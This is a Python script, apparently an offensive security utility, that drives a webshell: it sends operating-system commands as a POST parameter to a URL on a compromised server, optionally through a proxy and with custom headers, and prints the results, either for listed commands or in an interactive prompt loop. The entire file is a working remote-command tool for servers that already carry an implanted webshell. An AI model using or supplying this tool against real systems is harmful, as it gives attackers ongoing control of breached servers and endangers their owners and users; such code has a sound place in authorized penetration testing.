#! /usr/bin/python3

import requests
import argparse
import html2text
import sys

parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
parser.add_argument('--header', action='append', help='add header')
parser.add_argument('--param', default='cmd', help='param with command to use')
parser.add_argument('--cmd', help='command to send, can be multiples (&& operators are not supported)', action='append')
parser.add_argument('--html2text', action='store_true', help='print html on text mode')
parser.add_argument('--proxy', help='use a proxy')
parser.add_argument('url')

args = parser.parse_args()

url = args.url
param = args.param
commands = args.cmd


def execute(cmd, headers, h2t, proxy=None):

    session = requests.session()

    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}

    r = session.post(url, data={param: cmd}, headers=headers)

    print(r.request.url)

    t = r.text
    if h2t:
        t = html2text.html2text(t)
    print(t)


headers = {}
if args.header:
    for header in args.header:
        key = header.split(':')[0]
        value = header[header.index(': ') + 2:]
        headers[key] = value

if commands is not None and len(commands) != 0:
    for cmd in commands:
        execute(cmd, headers, args.html2text, args.proxy)
else:
    while True:
        c = input('--> ')
        execute(c, headers, args.html2text, args.proxy)
